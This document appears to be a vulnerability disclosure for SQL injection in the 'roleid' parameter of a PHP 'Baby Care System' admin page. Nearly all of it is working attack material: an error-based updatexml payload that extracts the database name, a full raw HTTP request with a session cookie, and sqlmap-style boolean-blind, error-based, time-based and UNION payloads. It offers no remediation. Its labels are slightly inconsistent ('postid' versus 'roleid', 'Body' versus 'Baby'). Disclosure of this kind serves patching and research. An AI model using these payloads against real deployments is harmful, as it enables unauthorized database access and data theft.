## Body Care System has SQL injection vulnerability

vendor: https://www.sourcecodester.com/php/14622/baby-care-system-phpmysqli-full-source-code.html

Vulnerability file: /BabyCare/admin/pagerole.php&action=edit&roleid=

![image](https://user-images.githubusercontent.com/54017627/161354417-66bda321-25ca-4aca-91bc-d90c9c074a33.png)

Vulnerability location: /BabyCare/admin.php?id=pagerole&action=edit&roleid= //postid is Injection point

[+]Payload:  /BabyCare/admin.php?id=pagerole&action=edit&roleid=1%27%20and%20updatexml(1,concat(0x7e,(select%20database()),0x7e),2)--+ //roleid is Injection point

```sql
GET /BabyCare/admin.php?id=pagerole&action=edit&roleid=1%27%20and%20updatexml(1,concat(0x7e,(select%20database()),0x7e),2)--+ HTTP/1.1
Host: 192.168.1.19
Cache-Control: max-age=0
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/99.0.4844.84 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9
Cookie: PHPSESSID=h48mjnelp4g0935821l2k3g5ne
Connection: close
```
![image](https://user-images.githubusercontent.com/54017627/161354255-69005e1b-1e0d-4860-b762-0669950e640b.png)

```sql
---
Parameter: roleid (GET)
    Type: boolean-based blind
    Title: AND boolean-based blind - WHERE or HAVING clause
    Payload: id=pagerole&action=edit&roleid=1' AND 3500=3500 AND 'WSTQ'='WSTQ

    Type: error-based
    Title: MySQL >= 5.0 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (FLOOR)
    Payload: id=pagerole&action=edit&roleid=1' AND (SELECT 1894 FROM(SELECT COUNT(*),CONCAT(0x71766a6a71,(SELECT (ELT(1894=1894,1))),0x71717a7671,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a) AND 'RNhF'='RNhF

    Type: time-based blind
    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
    Payload: id=pagerole&action=edit&roleid=1' AND (SELECT 1574 FROM (SELECT(SLEEP(5)))ajLi) AND 'Muhu'='Muhu

    Type: UNION query
    Title: Generic UNION query (NULL) - 4 columns
    Payload: id=pagerole&action=edit&roleid=-1597' UNION ALL SELECT NULL,CONCAT(0x71766a6a71,0x43596647727573766d505568646d54524c656f76624861765845474c474579724872425466624363,0x71717a7671),NULL,NULL-- -
---
```

![image](https://user-images.githubusercontent.com/54017627/161354345-4cf03726-ebc8-489e-ab6c-3fc1ebfd5018.png)
